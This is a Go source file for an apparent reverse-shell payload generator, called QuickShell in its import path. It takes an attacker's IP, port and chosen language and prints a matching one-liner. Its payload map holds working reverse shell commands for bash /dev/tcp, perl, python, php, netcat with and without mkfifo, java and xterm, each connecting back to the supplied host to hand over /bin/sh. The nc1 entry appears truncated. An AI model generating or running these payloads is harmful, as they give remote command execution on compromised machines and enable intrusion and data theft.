package main

import (
	"flag"
	"fmt"
	"log"

	rev "github.com/Cybernautica/QuickShell/pkg/functions"
)

func main() {

	ip := flag.String("ip", "", "Please provide your ip.")
	port := flag.String("port", "", "Please provide your port.")
	lang := flag.String("lang", "", "Please provide the language for the payload.")
	shell := flag.String("r", "", "Please provide the shell type. reverse/bind")
	silent := flag.Bool("s", false, "No Banner")
	flag.Parse()

	if !*silent {
		rev.Banner()
	}
	if *ip == "" {
		log.Fatalf("Please provide the ip!")
	}
	if *port == "" {
		log.Fatalf("Please provide the port!")
	}
	if *lang == "" {
		log.Fatalf("Please provide the payload language!")
	}
	if *shell == "" {
		log.Fatalf("Please provude the shell type. reverse/bind")
	} else {
		switch *shell {
		case "reverse":
			cmd := ReverseShell(*ip, *port, *lang)

			for _, v := range cmd {
				fmt.Println(v)
			}
		case "bind":
			log.Fatalf("[!!]Bind not supported yet!!")
		}
	}

	// jsonFile, err := os.Open("payload.json")
	// if err != nil {
	// 	fmt.Errorf("Print")
	// }
	// defer jsonFile.Close()

	// byteValue, _ := ioutil.ReadAll(jsonFile)

	// var payloads map[string]interface{}
	// json.Unmarshal([]byte(byteValue), &payloads)

	// fmt.Println(payloads["payload"])

	// plan, _ := ioutil.ReadFile("payload.json")
	// var data interface{}
	// err := json.Unmarshal(plan, &data)
	// fmt.Println(err)
}

func ReverseShell(ip string, port string, language string) []string {
	var payload []string

	lang := language
	payload = append(payload, fmt.Sprintf("[+]Payload -> "+payloads[lang], ip, port))
	return payload
}

var payloads = map[string]string{
	"bash":   `bash -i >& /dev/tcp/%v/%v 0>&1`,
	"perl":   `perl -e 'use Socket;$i="%v";$p=%v;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};`,
	"python": `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%v",%v));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
	"php":    `php -r '$sock=fsockopen("%v",%v);exec("/bin/sh -i <&3 >&3 2>&3");'`,
	//"ruby":   `ruby -rsocket -e'f=TCPSocket.open("%v",%v).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
	"nc":  `nc -e /bin/sh %v %v`,
	"nc1": `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %v %v >/tmp/`,
	"java": `r = Runtime.getRuntime()
		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%v/%v;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
		p.waitFor()`,
	"xterm": `xterm -display %v:%v`,
}
